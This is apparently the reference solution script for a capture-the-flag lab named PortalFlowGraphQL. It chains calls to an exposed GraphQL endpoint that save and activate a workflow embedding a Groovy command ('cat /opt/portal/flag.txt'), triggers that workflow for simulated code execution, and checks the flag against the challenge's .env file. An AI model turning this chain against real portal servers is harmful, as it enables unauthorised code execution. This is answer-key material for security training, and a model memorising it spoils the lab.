#!/usr/bin/env bash
# ============================================================
# PortalFlowGraphQL (labs27) - reference solution: default
# GraphQL endpoint -> workflow write/activate -> simulated RCE.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8107)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8107}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

flag="$(python3 - "$BASE" <<'PY'
import json
import re
import sys
import urllib.request

base = sys.argv[1].rstrip("/")


def graphql(query, variables=None):
    body = {"query": query}
    if variables is not None:
        body["variables"] = variables
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        base + "/o/graphql/v1",
        data=data,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as response:
        parsed = json.loads(response.read().decode())
    if parsed.get("errors"):
        raise RuntimeError(parsed["errors"])
    return parsed["data"]


schema = graphql("{ __schema { queryType { name } mutationType { name } } }")
if schema["__schema"]["mutationType"]["name"] != "Mutation":
    raise RuntimeError("GraphQL mutations are not exposed")

graphql(
    """
    query Workflows {
      workflowDefinitions(page: 1, pageSize: 20) {
        totalCount
        items { name active content }
      }
    }
    """
)

workflow_name = "ctf-proof"
workflow_xml = """<?xml version="1.0"?>
<workflow-definition>
  <name>ctf-proof</name>
  <state>
    <name>created</name>
    <actions>
      <action>
        <name>read-flag</name>
        <script-language>groovy</script-language>
        <script><![CDATA[
          return portal.exec("cat /opt/portal/flag.txt")
        ]]></script>
        <execution-type>onEntry</execution-type>
      </action>
    </actions>
  </state>
</workflow-definition>"""

graphql(
    """
    mutation SaveWorkflow($workflowDefinition: WorkflowDefinitionInput!) {
      createWorkflowDefinitionSave(workflowDefinition: $workflowDefinition) {
        name
        active
        version
      }
    }
    """,
    {
        "workflowDefinition": {
            "name": workflow_name,
            "content": workflow_xml,
            "active": False,
        }
    },
)

graphql(
    """
    mutation ActivateWorkflow($name: String!, $active: Boolean!) {
      createWorkflowDefinitionUpdateActive(name: $name, active: $active) {
        name
        active
        version
      }
    }
    """,
    {"name": workflow_name, "active": True},
)

result = graphql(
    """
    mutation TriggerWorkflow($content: ContentSubmissionInput!) {
      submitContentForReview(content: $content) {
        id
        title
        status
        workflowName
        workflowOutput
      }
    }
    """,
    {
        "content": {
            "title": "Quarterly security note",
            "body": "Please review.",
            "workflowName": workflow_name,
        }
    },
)

match = re.search(r"FLAG\{nusasec-[0-9a-f]{32}\}", result["submitContentForReview"]["workflowOutput"])
if not match:
    raise RuntimeError("flag not found in workflow output")
print(match.group(0))
PY
)"

if ! grep -Eq "^$FLAG_RE$" <<<"${flag:-}"; then
  echo "[-] failed: exploit did not print a valid arena flag" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
